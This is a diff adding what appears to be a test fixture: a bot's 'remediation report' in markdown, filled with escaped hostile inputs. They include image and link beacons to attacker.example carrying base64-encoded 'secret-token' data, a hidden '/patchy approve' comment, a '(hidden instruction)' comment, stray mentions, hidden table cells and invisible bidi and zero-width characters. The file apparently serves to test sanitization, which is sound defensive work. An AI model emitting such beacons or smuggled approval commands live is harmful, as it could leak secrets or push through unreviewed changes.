@@ -1,0 +1,20 @@
+<!-- patchy:report Remediation/1 -->
+## Remediation report (attempt 1)
+
+## Summary
+
+Fixes `#7`, closes `acme/app#8` and resolves `https://github.com/acme/app/issues/9`; fixes `GH-10`.
+cc `@admin` and `@acme/security` `&#64;`someone
+
+!\[build status](https://attacker.example/c?d=c2VjcmV0LXRva2Vu)
+\[details](https://attacker.example/l?d=c2VjcmV0) \<https://attacker.example/a?d=x>
+\<img src="https://attacker.example/i?d=x">
+\<!-- /patchy approve -->
+\<details>\<summary>more\</summary>hidden\</details>
+\[//]: # (hidden instruction)
+
+\| a \| b \|
+\| --- \| --- \|
+\| 1 \| 2 \| hidden cell \|
+
+Invisible: zero\[U+200B]width, bidi \[U+202E]esrever\[U+202C], tag \[U+E0041].
